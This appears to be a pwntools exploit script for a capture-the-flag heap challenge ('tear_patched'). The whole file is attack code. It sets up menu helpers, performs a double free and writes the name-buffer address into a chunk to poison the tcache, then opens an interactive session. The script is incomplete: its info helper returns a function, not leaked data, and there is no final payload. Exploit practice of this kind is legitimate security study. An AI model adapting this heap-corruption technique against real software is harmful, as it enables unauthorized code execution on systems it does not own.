from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x00400bc7
b *0x400b14
b *0x400c54
continue
'''.format(**locals())

exe = './tear_patched'

libc = ELF('./libc.so.6')

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

def nameBuf(s):
    # s = bytes
    sla(b'Name:', s)

def malloc(size, data):
    sla(b'Your choice :', b'1')
    sla(b'Size:', str(size).encode())
    sla(b'Data:', data)

def free():
    sla(b'Your choice :', b'2')

def info():
    sla(b'Your choice :', b'3')
    leak = rl
    return leak

conn = start()

nameBuf(b'tuan')
add_buf = 0x602060
malloc(31, p64(add_buf))
free()
free()
malloc(31, p64(add_buf))

conn.interactive()

